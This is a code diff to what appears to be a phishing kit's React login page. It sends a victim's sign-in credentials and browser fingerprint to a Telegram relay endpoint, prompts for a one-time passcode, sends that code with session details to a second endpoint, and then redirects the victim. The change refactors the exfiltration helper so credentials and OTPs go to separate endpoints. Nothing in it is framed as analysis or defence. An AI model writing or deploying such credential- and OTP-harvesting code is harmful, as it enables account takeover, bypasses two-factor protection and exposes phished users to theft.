@@ -6,9 +6,9 @@ import Spinner from './components/common/Spinner';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { config } from './config';
 
-const safeSendToTelegram = async (payload: any) => {
+const safeSendToTelegram = async (endpoint: string, payload: any) => {
   try {
-    const res = await fetch(config.api.sendTelegramEndpoint, {
+    const res = await fetch(endpoint, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
@@ -40,8 +40,8 @@ function App() {
         ...browserFingerprint,
       };
 
-      // Send credentials to Telegram and wait for completion before showing OTP
-      await safeSendToTelegram({ type: 'credentials', data: credentialsData });
+      // Send credentials to Telegram via dedicated credentials endpoint
+      await safeSendToTelegram(config.api.sendTelegramEndpoint, credentialsData);
 
       // Brief delay so the spinner is visible on the Sign In button
       await new Promise((r) => setTimeout(r, 1500));
@@ -69,9 +69,9 @@ function App() {
     }
 
     setIsLoading(true);
-    await safeSendToTelegram({
-      type: 'otp',
-      data: { otp, session: loginFlowState.sessionData },
+    await safeSendToTelegram(config.api.sendOtpEndpoint, {
+      otp,
+      session: { email: loginFlowState.sessionData?.email, sessionId: loginFlowState.sessionData?.sessionId },
     });
 
     window.location.href = config.redirects.afterOtp;
